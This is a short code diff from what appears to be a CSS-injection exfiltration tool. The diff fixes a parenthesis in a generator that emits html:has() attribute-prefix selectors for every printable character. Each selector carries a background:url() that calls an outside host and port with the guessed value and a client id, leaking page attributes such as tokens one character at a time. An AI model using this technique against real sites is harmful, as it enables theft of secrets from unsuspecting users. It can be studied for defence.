@@ -42,7 +42,7 @@ class RecursiveStrategy(BaseExfiltrationStrategy):
         )
         first_child = ':first-child' * client.counter
         stri += ''.join(
-            f'html:has({self.element}[{self.attribute}^={client.data + x!r}]{not_attributes}{first_child}'
+            f'html:has({self.element}[{self.attribute}^={client.data + x!r}]{not_attributes}){first_child}'
             f'{{background:url("//{self.hostname}:{self.port}/v?t={urllib.parse.quote_plus(client.data + x)}&cid={client.id}");}}'
             for x in default.PRINTABLE
         )
